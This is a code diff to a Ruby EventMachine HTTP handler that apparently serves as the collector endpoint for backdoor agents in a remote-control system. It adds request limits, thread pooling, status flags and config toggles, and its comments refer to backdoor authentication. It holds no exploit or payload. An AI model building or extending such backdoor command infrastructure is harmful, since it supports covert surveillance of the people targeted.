@@ -6,10 +6,11 @@
 require_relative 'heartbeat.rb'
 require_relative 'parser.rb'
 require_relative 'network_controller.rb'
-require_relative 'session.rb'
+require_relative 'sessions.rb'
 
 # from RCS::Common
 require 'rcs-common/trace'
+require 'rcs-common/status'
 
 # system
 require 'eventmachine'
@@ -31,13 +32,20 @@ class HTTPHandler < EM::Connection
     # don't forget to call super here !
     super
 
+    # to speed-up the processing, we disable the CGI environment variables
+    self.no_environment_strings
+
+    # set the max content length of the POST
+    self.max_content_length = 30 * 1024 * 1024
+
     # get the peer name
     @peer_port, @peer = Socket.unpack_sockaddr_in(get_peername)
-    trace :debug, "Connection from #{@peer}:#{@peer_port}"
+    @network_peer = @peer
+    trace :debug, "Connection from #{@network_peer}:#{@peer_port}"
   end
 
   def unbind
-    trace :debug, "Connection closed #{@peer}:#{@peer_port}"
+    trace :debug, "Connection closed #{@network_peer}:#{@peer_port}"
   end
 
   def process_http_request
@@ -54,7 +62,7 @@ class HTTPHandler < EM::Connection
     #   @http_headers
 
     trace :info, "[#{@peer}] Incoming HTTP Connection"
-    trace :debug, "[#{@peer}] Request: [#{@http_request_method}]  #{@http_request_uri}"
+    trace :debug, "[#{@peer}] Request: [#{@http_request_method}] #{@http_request_uri}"
 
     resp = EM::DelegatedHttpResponse.new(self)
 
@@ -67,7 +75,7 @@ class HTTPHandler < EM::Connection
       #   - the content_type
       #   - the cookie if the backdoor successfully passed the auth phase
       begin
-        content, content_type, cookie = http_parse(@http_request_method, @http_request_uri, @http_cookie, @http_post_content)
+        content, content_type, cookie = http_parse(@http_headers.split("\x00"), @http_request_method, @http_request_uri, @http_cookie, @http_post_content)
       rescue Exception => e
         trace :error, "ERROR: " + e.message
         trace :fatal, "EXCEPTION: " + e.backtrace.join("\n")
@@ -75,15 +83,18 @@ class HTTPHandler < EM::Connection
 
       # prepare the HTTP response
       resp.status = 200
+      resp.status_string = "OK"
       resp.content = content
       resp.headers['Content-Type'] = content_type
-      resp.headers['Set-Cookie'] = cookie unless cookie == nil
+      resp.headers['Set-Cookie'] = cookie unless cookie.nil?
+      #TODO: investigate the keep-alive option
+      #resp.keep_connection_open = true
+      resp.headers['Connection'] = 'close'
     end
 
     # Callback block to execute once the request is fulfilled
     callback = proc do |res|
     	resp.send_response
-      close_connection_after_writing
       trace :info, "[#{@peer}] HTTP Connection completed"
     end
 
@@ -99,26 +110,50 @@ class Events
   def setup(port = 80)
 
     # main EventMachine loop
-    # all the events are handled here
-    EM::run do
-      # if we have epoll(), prefer it over select()
-      EM.epoll
+    begin
+      # all the events are handled here
+      EM::run do
+        # if we have epoll(), prefer it over select()
+        EM.epoll
 
-      # start the HTTP server
-      EM::start_server("0.0.0.0", port, HTTPHandler)
-      trace :info, "Listening on port #{port}..."
+        # set the thread pool size
+        EM.threadpool_size = 50
 
-      # send the first heartbeat to the db, we are alive and want to notify the db immediately
-      HeartBeat.perform
+        # we are alive and ready to party
+        Status.my_status = Status::OK
 
-      # set up the heartbeat (the interval is in the config)
-      EM::PeriodicTimer.new(Config.instance.global['HB_INTERVAL']) { HeartBeat.perform }
+        # start the HTTP server
+        if Config.global['COLL_ENABLED'] then
+          EM::start_server("0.0.0.0", port, HTTPHandler)
+          trace :info, "Listening on port #{port}..."
 
-      # set up the network checks (the interval is in the config)
-      EM::PeriodicTimer.new(Config.instance.global['NC_INTERVAL']) { NetworkController.perform }
+          # send the first heartbeat to the db, we are alive and want to notify the db immediately
+          # subsequent heartbeats will be sent every HB_INTERVAL
+          HeartBeat.perform
 
-      # timeout for the sessions (will destroy inactive sessions)
-      EM::PeriodicTimer.new(60) { SessionManager.instance.timeout }
+          # set up the heartbeat (the interval is in the config)
+          EM::PeriodicTimer.new(Config.global['HB_INTERVAL']) { EM.defer(proc{ HeartBeat.perform }) }
+
+          # timeout for the sessions (will destroy inactive sessions)
+          EM::PeriodicTimer.new(60) { SessionManager.timeout }
+        end
+
+        # set up the network checks (the interval is in the config)
+        if Config.global['NC_ENABLED'] then
+          # first heartbeat and checks
+          EM.defer(proc{ NetworkController.check })
+          # subsequent checks
+          EM::PeriodicTimer.new(Config.global['NC_INTERVAL']) { EM.defer(proc{ NetworkController.check }) }
+        end
+
+      end
+    rescue Exception => e
+      # bind error
+      if e.message.eql? 'no acceptor' then
+        trace :fatal, "Cannot bind port #{Config.global['LISTENING_PORT']}"
+        return 1
+      end
+      raise
     end
 
   end
